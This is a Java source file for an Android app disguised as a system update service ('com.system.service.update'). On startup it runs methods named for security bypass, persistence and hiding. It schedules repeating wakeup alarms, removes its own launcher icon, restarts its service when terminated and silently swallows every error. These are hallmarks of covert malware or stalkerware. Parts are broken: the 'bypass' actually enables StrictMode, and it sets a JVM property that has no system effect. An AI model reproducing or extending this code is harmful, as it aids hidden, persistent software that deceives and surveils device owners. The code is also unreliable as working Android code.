// SystemApplication.java
package com.system.service.update;

import android.app.Application;
import android.os.Build;
import android.os.StrictMode;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;

public class SystemApplication extends Application {
    
    @Override
    public void onCreate() {
        super.onCreate();
        initializeSecurityBypass();
        initializePersistence();
        hideApplication();
    }
    
    private void initializeSecurityBypass() {
        try {
            // Disable strict mode
            StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder()
                .detectAll()
                .penaltyLog()
                .build());
            
            // Set system properties for stealth
            System.setProperty("persist.sys.strictmode.disable", "true");
            System.setProperty("debug.force_rtl", "false");
            
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void initializePersistence() {
        try {
            // Schedule periodic health checks
            android.app.AlarmManager alarmManager = 
                (android.app.AlarmManager) getSystemService(ALARM_SERVICE);
            
            android.content.Intent intent = new android.content.Intent(this, AlarmReceiver.class);
            android.app.PendingIntent pendingIntent = android.app.PendingIntent.getBroadcast(
                this, 0, intent, 
                android.app.PendingIntent.FLAG_UPDATE_CURRENT | 
                (Build.VERSION.SDK_INT >= 31 ? 0x4000000 : 0)
            );
            
            if (alarmManager != null) {
                alarmManager.setInexactRepeating(
                    android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    60000,
                    900000,
                    pendingIntent
                );
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void hideApplication() {
        try {
            // Hide from launcher
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(
                new android.content.ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    @Override
    public void onTerminate() {
        super.onTerminate();
        // Restart service if application is terminated
        restartService();
    }
    
    private void restartService() {
        try {
            android.content.Intent intent = new android.content.Intent(this, SystemService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            // Silent fail
        }
    }
}
